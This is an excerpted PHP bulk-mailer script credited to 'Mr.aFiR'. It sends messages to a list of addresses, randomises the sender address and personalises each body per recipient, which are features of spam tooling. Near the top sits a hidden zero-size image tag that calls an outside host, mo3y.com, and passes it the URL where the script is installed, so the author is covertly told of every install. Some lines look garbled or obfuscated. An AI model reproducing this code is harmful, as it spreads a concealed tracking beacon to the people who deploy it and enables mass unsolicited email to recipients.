...
<span class="style1">PHP eMailer is created by Mr.aFiR<br>
brought to you by   <font color=\"#800000\">http://www.afir.me/</font></span>
<?
if(!$action){
$l = "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']; $u = $t="gMailer";
echo "<img src='http://mo3y.com/afir/gif.jpg.php?l=$l&t=$t&u=&p=' height=0 width=0 border=0>";
}
?>
...
class PHPMailer {
  ...
  function CreateHeader() {
    ...
    $result .= $this->HeaderLine('X-Mailer', 'PHPMailer (Mujeemailer) [version ' . $this->Version . ']');
...
$defaultport="H*";
      $nq=0;
        ...
        for($x=0; $x<$numemails; $x++){
                ...
                $to = $allemails[$x];
				$pos = strpos($from, '000000', 1);
				if($pos){
					$rand = rand(100000, 999999);
					$from_a = str_replace("000000", "$rand", "$from");
				}else{
					$from_a = $from;
				}
                ...
                $message2 = ereg_replace("&email&", $to, $message);
...
$mail->AddAddress("$to");
		...
		$mail->Subject = "$subject $adddate";
    $name_extract =explode("@", $to);
    $good_name= $name_extract[0];
    $message2 = str_replace("email000",$good_name, $message2); //here replace string from body email000 with $to
   	        $mail->Body = "$message2"; 
if(!$mail->Send()){
if($default_system!="1"){
...
$smtp_conc=$IsSMTP($defaultport, $smtp_conf);
  ...
  <font color=\"#800000\">http://www.afir.me/</font></b><br></p>";$mail->SmtpClose();
